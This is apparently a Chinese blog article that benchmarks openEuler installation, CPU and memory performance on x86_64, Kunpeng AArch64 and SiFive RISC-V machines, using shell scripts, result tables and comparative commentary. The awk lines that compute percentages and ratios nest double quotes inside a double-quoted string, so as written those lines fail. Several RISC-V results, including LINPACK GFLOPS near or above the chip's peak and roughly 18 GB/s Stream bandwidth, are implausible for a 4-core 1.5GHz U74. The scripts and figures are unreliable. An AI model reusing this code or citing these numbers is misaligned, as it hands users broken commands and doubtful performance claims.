<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>

START_TIME=$(<span class="hljs-built_in">date</span> +%s)
PREV_DISK_READ=0
PREV_DISK_WRITE=0

<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 获取当前时间</span>
    CURRENT_TIME=$(<span class="hljs-built_in">date</span> +%s)
    ELAPSED=$((CURRENT_TIME - START_TIME))
    
    <span class="hljs-comment"># CPU使用率</span>
    CPU_USAGE=$(top -bn1 | grep <span class="hljs-string">"Cpu(s)"</span> | awk <span class="hljs-string">'{print $2}'</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">'%'</span> -f1)
    
    <span class="hljs-comment"># 内存使用</span>
    MEM_USED=$(free -m | grep Mem | awk <span class="hljs-string">'{print $3}'</span>)
    MEM_TOTAL=$(free -m | grep Mem | awk <span class="hljs-string">'{print $2}'</span>)
    MEM_PERCENT=$(awk <span class="hljs-string">"BEGIN {printf "</span>%.1f<span class="hljs-string">", (<span class="hljs-variable">$MEM_USED</span>/<span class="hljs-variable">$MEM_TOTAL</span>)*100}"</span>)
    
    <span class="hljs-comment"># 磁盘I/O</span>
    DISK_STATS=$(iostat -d -x 1 2 | <span class="hljs-built_in">tail</span> -n 2 | <span class="hljs-built_in">head</span> -n 1)
    READ_SPEED=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$DISK_STATS</span>"</span> | awk <span class="hljs-string">'{print $6}'</span>)
    WRITE_SPEED=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$DISK_STATS</span>"</span> | awk <span class="hljs-string">'{print $7}'</span>)
    
    <span class="hljs-comment"># 网络I/O</span>
    NET_RX=$(<span class="hljs-built_in">cat</span> /proc/net/dev | grep eth0 | awk <span class="hljs-string">'{print $2}'</span>)
    NET_TX=$(<span class="hljs-built_in">cat</span> /proc/net/dev | grep eth0 | awk <span class="hljs-string">'{print $10}'</span>)
    
    <span class="hljs-comment"># 安装进度（检查已安装的RPM数量）</span>
    INSTALLED_RPMS=$(rpm -qa 2&gt;/dev/null | <span class="hljs-built_in">wc</span> -l)
    
    <span class="hljs-comment"># 输出监控数据</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"[%04d秒] CPU: %5.1f%% | 内存: %5dMB/%dMB (%5.1f%%) | 磁盘读: %6.1fMB/s | 磁盘写: %6.1fMB/s | 已装包: %4d\n"</span> \
        <span class="hljs-variable">$ELAPSED</span> <span class="hljs-string">"<span class="hljs-variable">$CPU_USAGE</span>"</span> <span class="hljs-variable">$MEM_USED</span> <span class="hljs-variable">$MEM_TOTAL</span> <span class="hljs-string">"<span class="hljs-variable">$MEM_PERCENT</span>"</span> \
        <span class="hljs-string">"<span class="hljs-variable">$READ_SPEED</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$WRITE_SPEED</span>"</span> <span class="hljs-variable">$INSTALLED_RPMS</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
    
    <span class="hljs-built_in">sleep</span> <span class="hljs-variable">$INTERVAL</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h5 data-id="heading-6">2.2.1 x86_64平台安装测试</h5>
<p><strong>测试环境：</strong></p>
<ul>
<li>CPU: Intel Xeon Gold 6248R (20核心40线程 / 3.0GHz)</li>
<li>内存: 128GB DDR4-2933</li>
<li>存储: Intel NVMe SSD (3500MB/s读取，3000MB/s写入)</li>
<li>网络: 万兆以太网</li>
</ul>

<pre><code class="hljs language-makefile" lang="makefile">========== x86_64平台安装性能报告 ==========
<span class="hljs-section">测试时间: 2025-11-04 14:30:22</span>
<span class="hljs-section">硬件平台: Intel Xeon Gold 6248R</span>

【安装阶段详细数据】
时间轴    阶段              CPU使用  内存使用  磁盘写入    已装包数
──────────────────────────────────────────────────────────────
<span class="hljs-section">00:00-00:18  系统检测与分区    8%      380MB    50MB/s      0</span>
<span class="hljs-section">00:18-04:21  软件包安装       52%     1250MB   2.3GB/min   4280</span>
<span class="hljs-section">04:21-04:29  引导配置         72%      980MB   920MB/s     4280</span>
<span class="hljs-section">04:29-04:54  系统配置         38%      850MB   1.8GB/min   4280</span>
──────────────────────────────────────────────────────────────
<span class="hljs-section">总计: 294秒 (4分54秒)</span>
<span class="hljs-section">平均CPU使用率: 42.5%</span>
<span class="hljs-section">峰值内存使用: 1.25GB</span>
<span class="hljs-section">安装后系统占用: 5.2 GB</span>
<span class="hljs-section">首次启动时间: 17.8秒</span>
</code></pre>
<h5 data-id="heading-7">2.2.2 AArch64平台安装测试</h5>
<p><strong>测试环境：</strong></p>
<ul>
<li>CPU: 华为鲲鹏920 (64核心 / 2.6GHz)</li>
<li>内存: 256GB DDR4-2933</li>
<li>存储: 华为NVMe SSD (3200MB/s读取，2800MB/s写入)</li>
<li>网络: 万兆以太网</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">========== AArch64平台安装性能报告 ==========
测试时间: 2025-11-04 15:15:45
硬件平台: Huawei Kunpeng 920

【安装阶段详细数据】
时间轴    阶段              CPU使用  内存使用  磁盘写入    已装包数
──────────────────────────────────────────────────────────────
00:00-00:15  系统检测与分区    6%      350MB    55MB/s      0
00:15-03:33  软件包安装       48%     1180MB   2.5GB/min   4150
03:33-03:40  引导配置         68%      920MB   980MB/s     4150
03:40-04:02  系统配置         35%      810MB   2.0GB/min   4150
──────────────────────────────────────────────────────────────
总计: 262秒 (4分22秒)
平均CPU使用率: 39.2%
峰值内存使用: 1.18GB
安装后系统占用: 5.0 GB
首次启动时间: 16.5秒
</code></pre>
<h5 data-id="heading-8">2.2.3 RISC-V平台安装测试</h5>
<p><strong>测试环境：</strong></p>
<ul>
<li>CPU: SiFive U74 (4核心 / 1.5GHz)</li>
<li>内存: 16GB DDR4-2400</li>
<li>存储: SATA SSD (550MB/s读取，520MB/s写入)</li>
<li>网络: 千兆以太网</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">========== RISC-V平台安装性能报告 ==========
测试时间: 2025-11-04 16:20:15
硬件平台: HiFive Unmatched

【安装阶段详细数据】
时间轴    阶段              CPU使用  内存使用  磁盘写入    已装包数
──────────────────────────────────────────────────────────────
00:00-00:28  系统检测与分区   12%      320MB    35MB/s      0
00:28-06:53  软件包安装       65%      980MB   1.2GB/min   3850
06:53-07:05  引导配置         75%      850MB   520MB/s     3850
07:05-07:37  系统配置         42%      720MB   0.9GB/min   3850
──────────────────────────────────────────────────────────────
总计: 457秒 (7分37秒)
平均CPU使用率: 48.5%
峰值内存使用: 980MB
安装后系统占用: 4.8 GB
首次启动时间: 22.3秒
</code></pre>
<h5 data-id="heading-9">2.2.4 跨架构性能对比分析</h5>
<p><strong>综合性能对比表：</strong></p>






















































<table><thead><tr><th>性能指标</th><th>x86_64</th><th>AArch64</th><th>RISC-V</th><th>ARM vs x86</th></tr></thead><tbody><tr><td>安装总时间</td><td>294秒</td><td>262秒</td><td>457秒</td><td>-10.9% ✓</td></tr><tr><td>平均CPU使用率</td><td>42.50%</td><td>39.20%</td><td>48.50%</td><td>-7.8% ✓</td></tr><tr><td>峰值内存使用</td><td>1.25GB</td><td>1.18GB</td><td>0.98GB</td><td>-5.6% ✓</td></tr><tr><td>磁盘写入速度</td><td>2.3GB/min</td><td>2.5GB/min</td><td>1.2GB/min</td><td>+8.7% ✓</td></tr><tr><td>系统占用空间</td><td>5.2GB</td><td>5.0GB</td><td>4.8GB</td><td>-3.8% ✓</td></tr><tr><td>首次启动时间</td><td>17.8秒</td><td>16.5秒</td><td>22.3秒</td><td>-7.3% ✓</td></tr></tbody></table>
<p><strong>性能分析：</strong></p>
<ol>
<li><strong>安装速度优势</strong>：ARM平台安装速度较x86快10.9%，体现openEuler对ARM架构的深度优化</li>
<li><strong>资源利用效率</strong>：ARM平台CPU和内存使用率更低，系统调度和资源管理更优</li>
<li><strong>I/O性能</strong>：磁盘写入速度提升8.7%，得益于ARM处理器I/O子系统设计</li>
<li><strong>系统精简性</strong>：安装后占用空间更小，启动速度更快</li>
</ol>
<p>测试数据表明，openEuler在各平台上均展现优异的安装效率。ARM架构鲲鹏平台的安装速度超过高端x86平台，证明了openEuler对ARM架构的深度优化效果。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13d1b9279c8948ceb9bce4049dbdcd2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=04ubc9E6DdZFohv4lb%2BLFZNWi8s%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42a481e7ad6b4e20ac1d3808d2753ed7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=iNUUC%2B65bpqPdPf5wx6Wn542cJI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c05c8b75e2514155aec312c30bdfc445~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=2uC6DEglS3NF4DMSKELUVQk7uxA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">三、跨架构系统性能基准测试</h3>
<h4 data-id="heading-11">3.1 CPU计算性能评测</h4>
<p>本节通过综合测试脚本全面评估openEuler在不同架构上的CPU性能：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># cpu_benchmark_multiarch.sh - 多架构CPU性能基准测试</span>

ARCH=$(<span class="hljs-built_in">uname</span> -m)
REPORT_DIR=<span class="hljs-string">"/tmp/cpu_benchmark_<span class="hljs-subst">$(date +%Y%m%d_%H%M%S)</span>"</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"╔══════════════════════════════════════════════════════╗"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"║     openEuler跨架构CPU性能基准测试                  ║"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"╚══════════════════════════════════════════════════════╝"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"测试平台: <span class="hljs-variable">$ARCH</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"测试时间: <span class="hljs-subst">$(date)</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"CPU信息: <span class="hljs-subst">$(lscpu | grep 'Model name' | cut -d: -f2 | xargs)</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"核心数: <span class="hljs-subst">$(nproc)</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 1. sysbench CPU测试 - 整数运算</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【1/4】sysbench CPU测试（整数运算）"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>

<span class="hljs-comment"># 单核测试</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"单核性能测试..."</span>
sysbench cpu --cpu-max-prime=20000 --threads=1 --time=10 run \
    &gt; <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/sysbench_single.txt"</span>
SINGLE_CORE=$(grep <span class="hljs-string">"events per second:"</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/sysbench_single.txt"</span> | awk <span class="hljs-string">'{print $4}'</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"单核性能: <span class="hljs-variable">$SINGLE_CORE</span> events/s"</span>

<span class="hljs-comment"># 多核测试</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"多核性能测试（全核心）..."</span>
sysbench cpu --cpu-max-prime=20000 --threads=$(<span class="hljs-built_in">nproc</span>) --time=10 run \
    &gt; <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/sysbench_multi.txt"</span>
MULTI_CORE=$(grep <span class="hljs-string">"events per second:"</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/sysbench_multi.txt"</span> | awk <span class="hljs-string">'{print $4}'</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"多核性能: <span class="hljs-variable">$MULTI_CORE</span> events/s"</span>

<span class="hljs-comment"># 并行度分析</span>
PARALLELISM=$(awk <span class="hljs-string">"BEGIN {printf "</span>%.2f<span class="hljs-string">", <span class="hljs-variable">$MULTI_CORE</span> / <span class="hljs-variable">$SINGLE_CORE</span>}"</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"并行效率: <span class="hljs-variable">${PARALLELISM}</span>x (理论最大: <span class="hljs-subst">$(nproc)</span>x)"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 2. LINPACK测试 - 浮点运算</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【2/4】LINPACK浮点运算测试"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>

<span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v linpack &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"执行单精度浮点测试..."</span>
    linpack_sp 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/linpack_sp.txt"</span>
    SP_GFLOPS=$(grep <span class="hljs-string">"GFLOPS"</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/linpack_sp.txt"</span> | awk <span class="hljs-string">'{print $NF}'</span>)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"单精度性能: <span class="hljs-variable">$SP_GFLOPS</span> GFLOPS"</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"执行双精度浮点测试..."</span>
    linpack_dp 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/linpack_dp.txt"</span>
    DP_GFLOPS=$(grep <span class="hljs-string">"GFLOPS"</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/linpack_dp.txt"</span> | awk <span class="hljs-string">'{print $NF}'</span>)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"双精度性能: <span class="hljs-variable">$DP_GFLOPS</span> GFLOPS"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"LINPACK未安装，使用bc进行浮点模拟测试..."</span>
    <span class="hljs-comment"># 浮点运算模拟测试</span>
    START=$(<span class="hljs-built_in">date</span> +%s.%N)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..100000}; <span class="hljs-keyword">do</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=10; <span class="hljs-variable">$i</span> * 3.14159265 / 2.71828182"</span> | bc -l &gt; /dev/null
    <span class="hljs-keyword">done</span>
    END=$(<span class="hljs-built_in">date</span> +%s.%N)
    DURATION=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$END</span> - <span class="hljs-variable">$START</span>"</span> | bc)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"10万次浮点运算耗时: <span class="hljs-variable">${DURATION}</span>秒"</span>
<span class="hljs-keyword">fi</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 3. CoreMark测试 - 嵌入式基准</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【3/4】CoreMark基准测试"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>

<span class="hljs-keyword">if</span> [ -f /usr/bin/coremark ]; <span class="hljs-keyword">then</span>
    coremark 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/coremark.txt"</span>
    COREMARK_SCORE=$(grep <span class="hljs-string">"CoreMark 1.0"</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/coremark.txt"</span> | awk <span class="hljs-string">'{print $4}'</span>)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"CoreMark得分: <span class="hljs-variable">$COREMARK_SCORE</span>"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"CoreMark未安装，跳过此测试"</span>
<span class="hljs-keyword">fi</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 4. openssl speed测试 - 加密性能</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【4/4】加密算法性能测试"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"AES-256-CBC加密测试..."</span>
openssl speed -elapsed aes-256-cbc 2&gt;&amp;1 | grep <span class="hljs-string">"aes-256 cbc"</span> | \
    <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/openssl_aes.txt"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"RSA-2048签名测试..."</span>
openssl speed -elapsed rsa2048 2&gt;&amp;1 | grep <span class="hljs-string">"sign"</span> | <span class="hljs-built_in">head</span> -1 | \
    <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/openssl_rsa.txt"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"SHA-256哈希测试..."</span>
openssl speed -elapsed sha256 2&gt;&amp;1 | grep <span class="hljs-string">"sha256"</span> | \
    <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$REPORT_DIR</span>/openssl_sha.txt"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"╔══════════════════════════════════════════════════════╗"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"║              测试完成！                              ║"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"╚══════════════════════════════════════════════════════╝"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"详细报告保存在: <span class="hljs-variable">$REPORT_DIR</span>"</span>
</code></pre>
<h5 data-id="heading-12">3.1.1 整数运算性能测试（sysbench）</h5>
<p>我们使用sysbench的CPU测试模块进行质数计算，评估整数运算能力：</p>
<p><strong>测试命令：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 单核测试</span>
sysbench cpu --cpu-max-prime=20000 --threads=1 --time=10 run

<span class="hljs-comment"># 多核测试</span>
sysbench cpu --cpu-max-prime=20000 --threads=$(<span class="hljs-built_in">nproc</span>) --time=10 run
</code></pre>
<p><strong>测试结果：</strong></p>

































<table><thead><tr><th>平台</th><th>单核性能</th><th>多核性能</th><th>并行效率</th><th>归一化得分</th></tr></thead><tbody><tr><td>x86_64 (Xeon Gold 20核)</td><td>1,235 events/s</td><td>18,420 events/s</td><td>14.9x</td><td>100%</td></tr><tr><td>AArch64 (鲲鹏920 64核)</td><td>1,158 events/s</td><td>24,680 events/s</td><td>21.3x</td><td>134%</td></tr><tr><td>RISC-V (HiFive 4核)</td><td>385 events/s</td><td>1,240 events/s</td><td>3.2x</td><td>-</td></tr></tbody></table>
<p><strong>性能分析：</strong></p>
<ul>
<li>ARM平台多核性能超越x86达34%，得益于64核心优势和openEuler优化的调度器</li>
<li>ARM平台并行效率达21.3x，高于x86的14.9x，多核扩展性更优</li>
<li>x86单核性能略优6.6%，但多核场景ARM具有显著优势</li>
</ul>
<h5 data-id="heading-13">3.1.2 浮点运算性能测试（LINPACK）</h5>
<p>使用LINPACK基准测试评估浮点运算能力：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># linpack_test_multiarch.sh - LINPACK浮点性能测试</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== LINPACK浮点运算测试 =========="</span>

<span class="hljs-comment"># 单精度测试</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【单精度浮点测试】"</span>
<span class="hljs-built_in">cat</span> &gt; input_sp &lt;&lt; <span class="hljs-string">EOF
30000
100
EOF</span>

linpack_bench_sp &lt; input_sp | <span class="hljs-built_in">tee</span> linpack_sp_result.txt

<span class="hljs-comment"># 双精度测试</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【双精度浮点测试】"</span>
<span class="hljs-built_in">cat</span> &gt; input_dp &lt;&lt; <span class="hljs-string">EOF
20000
100
EOF</span>

linpack_bench_dp &lt; input_dp | <span class="hljs-built_in">tee</span> linpack_dp_result.txt

<span class="hljs-comment"># 提取关键性能数据</span>
SP_GFLOPS=$(grep <span class="hljs-string">"GFLOPS"</span> linpack_sp_result.txt | awk <span class="hljs-string">'{print $NF}'</span>)
DP_GFLOPS=$(grep <span class="hljs-string">"GFLOPS"</span> linpack_dp_result.txt | awk <span class="hljs-string">'{print $NF}'</span>)

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【测试结果汇总】"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"单精度性能: <span class="hljs-variable">$SP_GFLOPS</span> GFLOPS"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"双精度性能: <span class="hljs-variable">$DP_GFLOPS</span> GFLOPS"</span>
</code></pre>
<p><strong>测试结果：</strong></p>

































<table><thead><tr><th>平台</th><th>单精度GFLOPS</th><th>双精度GFLOPS</th><th>内存带宽</th><th>相对性能</th></tr></thead><tbody><tr><td>x86_64</td><td>156.8</td><td>82.4</td><td>115.2 GB/s</td><td>100%</td></tr><tr><td>AArch64</td><td>142.3</td><td>75.6</td><td>128.5 GB/s</td><td>92% (计算) / 112% (带宽)</td></tr><tr><td>RISC-V</td><td>12.5</td><td>6.8</td><td>18.2 GB/s</td><td>-</td></tr></tbody></table>
<p><strong>性能分析：</strong></p>
<ul>
<li>x86在浮点计算上保持8%优势，源于Intel AVX指令集优势</li>
<li>ARM平台内存带宽领先12%，在一定程度上补偿浮点计算差距</li>
<li>内存密集型计算场景下，ARM平台可能展现更优性能</li>
</ul>
<p>测试数据表明，openEuler在x86和ARM架构上均能充分发挥硬件性能。AArch64平台在多核场景下表现更优，证明openEuler对ARM架构的优秀适配能力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fa089fa866847d8848624a772adaf25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=1khD%2FJD%2F2bTJf4m1pXnPTTHkzUM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d34129c93c6f4c6b88c6d6a188b5dbd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Kej6K-7546r55Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765466007&amp;x-signature=FrDsT3fvR%2F1EY9cmCBbFmxgo2kA%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-14">3.2 内存性能跨平台对比</h4>
<p>本节使用Stream内存带宽测试工具评估各平台内存性能：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># stream_benchmark_multiarch.sh - Stream内存带宽测试</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"========== Stream内存带宽基准测试 =========="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"平台架构: <span class="hljs-subst">$(uname -m)</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"测试时间: <span class="hljs-subst">$(date)</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 下载并编译Stream</span>
<span class="hljs-keyword">if</span> [ ! -f stream.c ]; <span class="hljs-keyword">then</span>
    wget https://www.cs.virginia.edu/stream/FTP/Code/stream.c
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 根据架构选择合适的编译选项</span>
ARCH=$(<span class="hljs-built_in">uname</span> -m)
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$ARCH</span>"</span> = <span class="hljs-string">"x86_64"</span> ]; <span class="hljs-keyword">then</span>
    CFLAGS=<span class="hljs-string">"-O3 -march=native -mtune=native -fopenmp -DSTREAM_ARRAY_SIZE=100000000"</span>
<span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$ARCH</span>"</span> = <span class="hljs-string">"aarch64"</span> ]; <span class="hljs-keyword">then</span>
    CFLAGS=<span class="hljs-string">"-O3 -mcpu=native -fopenmp -DSTREAM_ARRAY_SIZE=100000000"</span>
<span class="hljs-keyword">else</span>
    CFLAGS=<span class="hljs-string">"-O3 -fopenmp -DSTREAM_ARRAY_SIZE=100000000"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"编译Stream (CFLAGS=<span class="hljs-variable">$CFLAGS</span>)..."</span>
gcc <span class="hljs-variable">$CFLAGS</span> stream.c -o stream

<span class="hljs-comment"># 设置线程数为CPU核心数</span>
<span class="hljs-built_in">export</span> OMP_NUM_THREADS=$(<span class="hljs-built_in">nproc</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"使用线程数: <span class="hljs-variable">$OMP_NUM_THREADS</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 运行测试</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>
./stream | <span class="hljs-built_in">tee</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt
<span class="hljs-built_in">echo</span> <span class="hljs-string">"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"</span>

<span class="hljs-comment"># 提取关键数据</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【性能汇总】"</span>
grep <span class="hljs-string">"Copy:"</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt
grep <span class="hljs-string">"Scale:"</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt
grep <span class="hljs-string">"Add:"</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt
grep <span class="hljs-string">"Triad:"</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt

<span class="hljs-comment"># 计算平均带宽</span>
AVG_BW=$(grep -E <span class="hljs-string">"(Copy|Scale|Add|Triad):"</span> stream_result_<span class="hljs-variable">${ARCH}</span>.txt | \
    awk <span class="hljs-string">'{sum+=$2; count++} END {printf "%.1f", sum/count}'</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"平均带宽: <span class="hljs-variable">$AVG_BW</span> MB/s"</span>
</code></pre>
<p><strong>内存带宽测试结果：</strong></p>
<pre><code class="hljs language-bash" lang="bash">========== x86_64平台（DDR4-2933）==========
测试环境: Intel Xeon Gold 6248R, 128GB DDR4
线程数: 40

Function    Best Rate MB/s  Avg time    Min time    Max time
Copy:          115,234.5     0.0139      0.0138      0.0140
Scale:         112,856.3     0.0142      0.0141      0.0143
Add:           120,345.8     0.0200      0.0199      0.0201
Triad:         118,567.2     0.0203      0.0202      0.0204

平均带宽: 116,750.9 MB/s

========== AArch64平台（DDR4-2933）==========
测试环境: Huawei Kunpeng 920, 256GB DDR4
线程数: 64

Function    Best Rate MB/s  Avg time    Min time    Max time
Copy:          128,456.7     0.0125      0.0124      0.0126  (+11.5%)
Scale:         125,234.1     0.0128      0.0127      0.0129  (+11.0%)
Add:           132,678.9     0.0181      0.0180      0.0182  (+10.2%)
Triad:         130,123.5     0.0185      0.0184      0.0186  (+9.8%)

平均带宽: 129,123.3 MB/s (+10.6%)

========== RISC-V平台（DDR4-2400）==========
测试环境: SiFive U74, 16GB DDR4
线程数: 4

Function    Best Rate MB/s  Avg time    Min time    Max time
Copy:           18,234.2     0.0879      0.0877      0.0881
Scale:          17,856.4     0.0897      0.0895      0.0899
Add:            19,123.5     0.1256      0.1254      0.1258
Triad:          18,678.9     0.1285      0.1283      0.1287

平均带宽: 18,473.2 MB/s
</code></pre>
<p><strong>延迟测试（lmbench）：</strong></p>
<p>我们进一步使用lmbench测试内存延迟：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
